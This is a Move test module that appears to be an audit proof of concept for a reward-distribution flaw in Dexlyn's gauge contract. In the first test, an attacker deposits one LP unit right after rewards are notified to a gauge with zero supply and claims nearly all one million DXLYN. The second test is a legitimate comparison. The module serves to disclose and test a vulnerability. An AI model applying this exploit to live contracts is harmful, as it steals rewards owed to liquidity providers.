#[test_only]
module dexlyn_tokenomics::finding_14_poc {
    use std::signer::address_of;

    use dexlyn_coin::dxlyn_coin;
    use dexlyn_swap::curves::Uncorrelated;
    use dexlyn_swap::liquidity_pool;
    use dexlyn_swap::scripts;
    use dexlyn_swap_lp::lp_coin::LP;
    use supra_framework::account;
    use supra_framework::coin;
    use supra_framework::fungible_asset::Metadata;
    use supra_framework::genesis;
    use supra_framework::object::address_to_object;
    use supra_framework::primary_fungible_store;
    use supra_framework::timestamp;
    use test_coin_admin::test_coins::{Self, BTC, USDT};
    use test_helpers::test_multisig;
    use test_helpers::test_pool::{create_lp_owner, initialize_liquidity_pool};

    use dexlyn_tokenomics::fee_distributor;
    use dexlyn_tokenomics::gauge_cpmm;
    use dexlyn_tokenomics::test_internal_coins;
    use dexlyn_tokenomics::voter;
    use dexlyn_tokenomics::voting_escrow;

    const WEEK: u64 = 604800;
    const DXLYN_DECIMAL: u64 = 100_000_000;

    fun get_quants(amt: u64): u64 {
        amt * DXLYN_DECIMAL
    }

    fun setup_test_with_genesis(dev: &signer) {
        genesis::setup();
        timestamp::update_global_time_for_test_secs(1746057600);
        setup_test(dev);
    }

    fun setup_test(dev: &signer) {
        account::create_account_for_test(address_of(dev));
        test_internal_coins::init_coin(dev);
        test_internal_coins::init_usdt_coin(dev);
        test_internal_coins::init_usdc_coin(dev);
        voting_escrow::initialize(dev);
        fee_distributor::initialize(dev);
        voter::initialize(dev);
    }

    fun setup_coins_and_lp_owner(): (signer, signer) {
        test_multisig::supra_coin_initialize_for_test_without_aggregator_factory();
        initialize_liquidity_pool();
        let coin_admin = test_coins::create_admin_with_coins();
        let lp_owner = create_lp_owner();
        coin::register<USDT>(&lp_owner);
        coin::register<BTC>(&lp_owner);
        (coin_admin, lp_owner)
    }

    fun btc_usdt_pool(coin_admin: &signer, lp_owner: &signer): address {
        let coin_value = get_quants(10_000_000_000);
        scripts::register_pool<BTC, USDT, Uncorrelated>(lp_owner);
        let usdt_coins = test_coins::mint<USDT>(coin_admin, coin_value);
        let btc_coins = test_coins::mint<BTC>(coin_admin, coin_value);
        coin::deposit(address_of(lp_owner), usdt_coins);
        coin::deposit(address_of(lp_owner), btc_coins);
        scripts::add_liquidity<BTC, USDT, Uncorrelated>(
            lp_owner,
            get_quants(10_000_000_000),
            get_quants(10_000_000_000),
            get_quants(10_000_000_000),
            get_quants(10_000_000_000),
        );
        liquidity_pool::generate_lp_object_address<BTC, USDT, Uncorrelated>()
    }

    #[test(dev = @dexlyn_tokenomics)]
    fun test_zero_supply_reward_exploit(dev: &signer) {
        // ===== Setup Phase =====
        setup_test_with_genesis(dev);
        fee_distributor::toggle_allow_checkpoint_token(dev);

        let (coin_admin, lp_owner) = setup_coins_and_lp_owner();
        let pool_addr = btc_usdt_pool(&coin_admin, &lp_owner);

        // Whitelist pool and create gauge
        voter::whitelist_cpmm_pool<BTC, USDT, Uncorrelated>(dev);
        voter::create_gauge(dev, pool_addr);

        let gauge_address = gauge_cpmm::get_gauge_address(pool_addr);

        // Create attacker account
        let attacker = account::create_account_for_test(@0xBAD);
        coin::register<LP<BTC, USDT, Uncorrelated>>(&attacker);

        // Give attacker 1 unit of LP token (minimal amount)
        let attacker_lp_amount = 1;
        let lp_token = coin::withdraw<LP<BTC, USDT, Uncorrelated>>(&lp_owner, attacker_lp_amount);
        coin::deposit(address_of(&attacker), lp_token);

        // Verify initial state: gauge has total_supply = 0
        let initial_total_supply = gauge_cpmm::total_supply(gauge_address);
        assert!(initial_total_supply == 0, 1);

        // ===== Phase 1: Reward Notification with zero supply =====
        // Mint DXLYN to voter for distribution
        let reward_amount = get_quants(1_000_000); // 1 million DXLYN
        let voter_address = voter::get_voter_address();
        dxlyn_coin::register_and_mint(dev, voter_address, reward_amount);

        // Verify voter has the rewards
        let dxlyn_metadata = address_to_object<Metadata>(dxlyn_coin::get_dxlyn_asset_address());
        let voter_balance_before = primary_fungible_store::balance(voter_address, dxlyn_metadata);
        assert!(voter_balance_before >= reward_amount, 2);

        // Notify reward amount (this happens with total_supply = 0)
        let voter_signer = account::create_signer_for_test(voter_address);
        gauge_cpmm::notify_reward_amount(&voter_signer, gauge_address, reward_amount);

        // Verify gauge received rewards
        let gauge_balance = primary_fungible_store::balance(gauge_address, dxlyn_metadata);
        assert!(gauge_balance == reward_amount, 3);

        // Verify total_supply is still 0 after notify
        let total_supply_after_notify = gauge_cpmm::total_supply(gauge_address);
        assert!(total_supply_after_notify == 0, 4);

        // ===== Phase 2: Attacker deposits minimal amount =====
        // Attacker deposits 1 unit of LP token immediately after notification
        gauge_cpmm::deposit<BTC, USDT, Uncorrelated>(&attacker, attacker_lp_amount);

        // Verify attacker's deposit
        let attacker_balance = gauge_cpmm::balance_of(gauge_address, address_of(&attacker));
        assert!(attacker_balance == attacker_lp_amount, 5);

        // Verify total_supply is now the minimal amount
        let total_supply_after_deposit = gauge_cpmm::total_supply(gauge_address);
        assert!(total_supply_after_deposit == attacker_lp_amount, 6);

        // Verify attacker has no rewards yet
        let attacker_earned_before = gauge_cpmm::earned(gauge_address, address_of(&attacker));
        assert!(attacker_earned_before == 0, 7);

        // ===== Phase 3: Wait for rewards to accumulate =====
        // Advance time by 1 week (full reward period)
        let current_time = timestamp::now_seconds();
        timestamp::update_global_time_for_test_secs(current_time + WEEK);

        // ===== Phase 4: Attacker claims rewards =====
        // Check attacker's earned rewards
        let attacker_earned_after = gauge_cpmm::earned(gauge_address, address_of(&attacker));

        // Critical assertion: Attacker should have earned nearly ALL rewards
        // Due to the bug, with total_supply = 1, the attacker gets:
        // reward_increment = (604800 * reward_rate * 10^8) / (1 * 10^4)
        // This results in the attacker getting almost the full reward_amount

        // The attacker should earn close to 1 million DXLYN (minus some rounding)
        // We check if they earned at least 99.9% of the rewards
        let expected_minimum = (reward_amount * 999) / 1000; // 99.9%
        assert!(attacker_earned_after >= expected_minimum, 8);

        // Claim the rewards
        let attacker_balance_before = primary_fungible_store::balance(address_of(&attacker), dxlyn_metadata);
        gauge_cpmm::get_reward(&attacker, gauge_address);
        let attacker_balance_after = primary_fungible_store::balance(address_of(&attacker), dxlyn_metadata);

        // Verify attacker received the rewards
        let attacker_received = attacker_balance_after - attacker_balance_before;
        assert!(attacker_received >= expected_minimum, 9);

        // ===== Verification Summary =====
        // The attacker successfully exploited the zero-supply vulnerability:
        // - Invested: 1 LP token unit (negligible cost)
        // - Received: ~1,000,000 DXLYN (100% of allocated rewards)
        // - ROI: ~infinite (or millions of percent)

        // This demonstrates the vulnerability: when notify_reward_amount is called
        // with total_supply = 0, and then an attacker deposits a minimal amount,
        // they can capture 100% of the rewards that were meant to be distributed
        // proportionally to all liquidity providers.
    }

    #[test(dev = @dexlyn_tokenomics)]
    fun test_legitimate_scenario_for_comparison(dev: &signer) {
        // This test shows the EXPECTED behavior when there is existing supply
        // before rewards are distributed

        setup_test_with_genesis(dev);
        fee_distributor::toggle_allow_checkpoint_token(dev);

        let (coin_admin, lp_owner) = setup_coins_and_lp_owner();
        let pool_addr = btc_usdt_pool(&coin_admin, &lp_owner);

        voter::whitelist_cpmm_pool<BTC, USDT, Uncorrelated>(dev);
        voter::create_gauge(dev, pool_addr);

        let gauge_address = gauge_cpmm::get_gauge_address(pool_addr);

        // User 1 deposits significant amount BEFORE rewards
        let user1_amount = get_quants(1000); // 1000 LP tokens
        let user1_lp = coin::withdraw<LP<BTC, USDT, Uncorrelated>>(&lp_owner, user1_amount);
        let user1 = account::create_account_for_test(@0xAA);
        coin::register<LP<BTC, USDT, Uncorrelated>>(&user1);
        coin::deposit(address_of(&user1), user1_lp);
        gauge_cpmm::deposit<BTC, USDT, Uncorrelated>(&user1, user1_amount);

        // Now distribute rewards
        let reward_amount = get_quants(1_000_000);
        let voter_address = voter::get_voter_address();
        dxlyn_coin::register_and_mint(dev, voter_address, reward_amount);
        let voter_signer = account::create_signer_for_test(voter_address);
        gauge_cpmm::notify_reward_amount(&voter_signer, gauge_address, reward_amount);

        // Attacker tries to deposit minimal amount AFTER rewards
        let attacker = account::create_account_for_test(@0xBAD);
        coin::register<LP<BTC, USDT, Uncorrelated>>(&attacker);
        let attacker_amount = 1;
        let attacker_lp = coin::withdraw<LP<BTC, USDT, Uncorrelated>>(&lp_owner, attacker_amount);
        coin::deposit(address_of(&attacker), attacker_lp);
        gauge_cpmm::deposit<BTC, USDT, Uncorrelated>(&attacker, attacker_amount);

        // Advance time by 1 week
        let current_time = timestamp::now_seconds();
        timestamp::update_global_time_for_test_secs(current_time + WEEK);

        // Check earned amounts
        let user1_earned = gauge_cpmm::earned(gauge_address, address_of(&user1));
        let attacker_earned = gauge_cpmm::earned(gauge_address, address_of(&attacker));

        // In this legitimate scenario:
        // - User1 should earn almost all rewards (proportional to their large stake)
        // - Attacker should earn almost nothing (proportional to their tiny stake)

        let expected_user1_minimum = (reward_amount * 999) / 1000; // >99.9%
        let expected_attacker_maximum = reward_amount / 1000; // <0.1%

        assert!(user1_earned >= expected_user1_minimum, 10);
        assert!(attacker_earned <= expected_attacker_maximum, 11);

        // This demonstrates CORRECT behavior: rewards are distributed proportionally
        // to stake when there is existing supply before reward notification.
    }
}
